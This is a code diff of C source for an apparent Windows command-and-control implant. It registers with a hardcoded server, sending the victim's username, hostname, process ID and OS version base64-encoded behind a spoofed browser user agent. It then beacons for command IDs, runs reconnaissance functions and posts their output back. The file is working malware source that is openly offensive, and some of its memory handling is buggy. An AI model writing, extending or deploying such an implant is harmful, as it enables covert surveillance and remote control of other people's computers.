@@ -5,28 +5,44 @@
 #include <settings.h>
 #include <imports.h>
 #include <paths.h>
-#include <patch.h>
 
-BOOL (*patch_list_pointers[3]) (CHAR **ouput);
+#define pointer_length 3
+unsigned char patch_list_name[pointer_length] = {0xAA, 0xAB, 0xAC};
 
-BOOL AA$whoami() {
-    printf("whoami");
+BOOL AA$whoami(CHAR **output) {
+    HMODULE hadvapi32 = LoadLibraryA("advapi32.dll");
+    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
+
+    DWORD username_buffer = 256;
+    CHAR username[256];
+    if (myGetUserNameA(username, &username_buffer)) {
+        *output = (CHAR*)calloc(strlen(username) + 1, sizeof(CHAR));
+        strcat_s(*output, strlen(username) + 1, username);
+        return TRUE;
+    }
+    return FALSE;
 }
 
 BOOL AB$pwd() {
-    printf("pwd");
+    printf("This is pwd");
 }
 
 BOOL AC$hostname() {
-    printf("hostname");
+    printf("This is hostname");
 }
+
+BOOL (*patch_list_pointers[pointer_length]) (CHAR **output) = {AA$whoami, AB$pwd, AC$hostname};
 
 BOOL Registration(CHAR **cookie) {
     HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+    HMODULE hadvapi32 = LoadLibraryA("advapi32.dll");
+    //HMODULE hwininet = LoadLibraryA("wininet.dll");
     GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
-    //GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hkernel32, "GetUserNameA"); This call isn't working not sure why
+    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
     GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
     GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
+
+    //INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
 
     agent.identifier = "register";
 
@@ -36,7 +52,7 @@ BOOL Registration(CHAR **cookie) {
     }
 
     DWORD username_buffer = 256;
-    if (GetUserNameA(job.username, &username_buffer)) {
+    if (myGetUserNameA(job.username, &username_buffer)) {
         printf("Username: %s \n", job.username);
     }
 
@@ -53,7 +69,7 @@ BOOL Registration(CHAR **cookie) {
     CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
     sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);
 
-    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode));
+    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode) * 2);
     DWORD data_encode_len = strlen(data_to_encode) * 2;
     CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
 
@@ -65,10 +81,8 @@ BOOL Registration(CHAR **cookie) {
 
     free(data_encode);
 
-
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
-
 
     HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
@@ -120,7 +134,7 @@ BOOL Registration(CHAR **cookie) {
 }
 
 BOOL Beacon(CHAR  *cookie) {
-    printf("Beaconing");
+    printf("Beaconing...\n");
     CHAR *cmd = NULL;
     agent.identifier = "beacon";
 
@@ -193,13 +207,68 @@ BOOL Beacon(CHAR  *cookie) {
 }
 
 BOOL Process(char* cookie, char *cmd) {
-    int length = strlen(cmd);
-    char *alloc = (CHAR*)calloc(length + 1, sizeof(CHAR));
-
-    char *output_1 = (CHAR*)calloc(10, sizeof(CHAR));
+    char *allocated_output = (CHAR*)calloc(10, sizeof(CHAR));
 
     int cmd_int = atoi(cmd);
     printf("Command: 0x%x\n", cmd_int);
+
+    char *output = NULL;
+
+    for (int i = 0; i < pointer_length; i++) {
+        if (cmd_int == patch_list_name[i]) {
+            printf("Executing Command\n");
+            if ((*patch_list_pointers)(&output)) {
+                printf("Output:%s", output);
+
+                int output_length = strlen(allocated_output) + strlen(output) + 1;
+                allocated_output = (CHAR*)realloc(allocated_output, output_length);
+                strcat_s(allocated_output, output_length, output);
+            }
+        }
+    }
+    free(output);
+
+    if (strlen(allocated_output) > 0) {
+        CHAR *format = "%s:%s";
+        CHAR *identifier = "output";
+
+        CHAR *data_to_encode = malloc(strlen(format) + strlen(identifier) + strlen(allocated_output));
+        sprintf(data_to_encode, format, identifier, allocated_output);
+
+        CHAR *data_encode = malloc(strlen(data_to_encode));
+        DWORD data_encode_len = strlen(data_to_encode) * 2;
+        CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+
+        DWORD post_buffer_length = strlen(data_encode) + 5;
+        CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
+        sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);
+
+        CHAR content_length[MAX_PATH];
+        sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
+
+        HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (hInternet != NULL) {
+            HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+            if (hConnect != NULL) {
+                HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
+                if (hRequest != NULL) {
+                    HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
+                    HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
+                    if (hRequest) {
+                        InternetCloseHandle(hRequest);
+                    }
+                    if (hConnect) {
+                        InternetCloseHandle(hConnect);
+                    }
+                    if (hInternet) {
+                        InternetCloseHandle(hInternet);
+                    }
+                }
+            }
+        }
+        free(post_buffer);
+        return TRUE;
+    }
 }
 
 void Sleep_Time() {
@@ -220,15 +289,11 @@ char* Directoryyyyy() {
 int main() {
 
     CHAR *cookie = NULL;
-    agent.address = "192.168.227.131";
+    agent.address = "192.168.227.135";
     agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     agent.port = 8080;
     agent.path = Directoryyyyy();
     agent.key = "boondoggle";
-
-    patch_list_pointers[0] = AA$whoami;
-    patch_list_pointers[1] = AB$pwd;
-    patch_list_pointers[2] = AC$hostname;
 
     Registration(&cookie);
     Sleep_Time();
